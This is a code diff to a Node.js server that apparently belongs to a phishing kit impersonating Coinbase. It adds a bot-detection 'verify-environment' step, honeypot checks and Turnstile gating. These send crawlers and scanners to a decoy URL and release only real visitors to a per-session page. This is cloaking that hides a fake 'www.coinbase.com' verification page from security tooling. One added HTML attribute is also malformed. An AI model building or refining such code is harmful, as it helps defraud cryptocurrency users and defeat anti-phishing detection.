@@ -660,6 +660,35 @@ app.get('/', (req, res) => {
     res.json({ success: true });
 });
 
+app.post('/verify-environment', async (req, res) => {
+    try {
+        const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                        req.headers['x-real-ip'] || 
+                        req.socket.remoteAddress;
+        const userAgent = req.headers['user-agent'];
+
+        // Use our existing bot detection
+        if (checkBot(userAgent)) {
+            console.log('Bot detected via user agent:', userAgent);
+            return res.json({ valid: false, reason: 'bot_detected' });
+        }
+
+        // Use our behavior detection
+        if (checkBotBehavior(req)) {
+            console.log('Bot behavior detected:', {
+                ip: clientIP,
+                userAgent
+            });
+            return res.json({ valid: false, reason: 'suspicious_behavior' });
+        }
+
+        res.json({ valid: true });
+    } catch (error) {
+        console.error('Environment verification error:', error);
+        res.json({ valid: false, reason: 'verification_error' });
+    }
+});
+
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
@@ -735,6 +764,101 @@ app.get('/check-ip', async (req, res) => {
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
         <script src="/socket.io/socket.io.js"></script>
     <script src="/js/socket-client.js"></script>
+    <script>
+    let captchaToken = null;
+    let verificationAttempts = 0;
+    const maxAttempts = 3;
+
+    // Check environment before showing captcha
+    async function verifyEnvironment() {
+        try {
+            const response = await fetch('/verify-environment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            });
+
+            const result = await response.json();
+            if (!result.valid) {
+                console.error('Environment verification failed:', result.reason);
+                window.location.replace('${state.settings.redirectUrl}');
+                return false;
+            }
+
+            // Show captcha only after environment verification passes
+            document.getElementById('captchaContainer').style.display = 'block';
+            return true;
+        } catch (error) {
+            console.error('Error verifying environment:', error);
+            window.location.replace('${state.settings.redirectUrl}');
+            return false;
+        }
+    }
+
+    async function onCaptchaSuccess(token) {
+        captchaToken = token;
+        await checkAccess();
+    }
+
+    async function checkAccess() {
+        if (verificationAttempts >= maxAttempts) {
+            console.error('Too many verification attempts');
+            window.location.replace('${state.settings.redirectUrl}');
+            return;
+        }
+
+        verificationAttempts++;
+
+        try {
+            const sessionId = new URLSearchParams(window.location.search).get('client_id');
+            
+            // Check honeypot fields first
+            const formData = new FormData(document.getElementById('contact-form'));
+            const honeypotData = {
+                email: formData.get('email'),
+                username: formData.get('username'),
+                website: formData.get('website')
+            };
+
+            const honeypotResponse = await fetch('/verify-honeypot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(honeypotData)
+            });
+
+            const honeypotResult = await honeypotResponse.json();
+            if (honeypotResult.redirect) {
+                window.location.replace(honeypotResult.redirect);
+                return;
+            }
+
+            if (${state.settings.antiBotEnabled ? 'true' : 'false'}) {
+                const verifyResponse = await fetch('/verify-turnstile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        token: captchaToken,
+                        sessionId: sessionId
+                    })
+                });
+                
+                const verifyResult = await verifyResponse.json();
+                if (verifyResult.success && verifyResult.verified && verifyResult.url) {
+                    window.location.replace(verifyResult.url);
+                } else {
+                    console.error('Verification failed:', verifyResult.error);
+                }
+            }
+        } catch (error) {
+            console.error('Error in checkAccess:', error);
+        }
+    }
+
+    // Initially hide captcha
+    document.addEventListener('DOMContentLoaded', () => {
+        document.getElementById('captchaContainer').style.display = 'none';
+        verifyEnvironment();
+    });
+</script>
     <style>
         * {
             box-sizing: border-box;
@@ -859,7 +983,7 @@ app.get('/check-ip', async (req, res) => {
             <h1 class="h1">www.coinbase.com</h1>
             <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
             
-            <div id="captchaContainer">
+            <div id="captchaContainer" style="display: none;>
                 <div class="cf-turnstile" 
                     data-sitekey="${process.env.CLOUDFLARE_SITE_KEY}"
                     data-callback="onCaptchaSuccess"
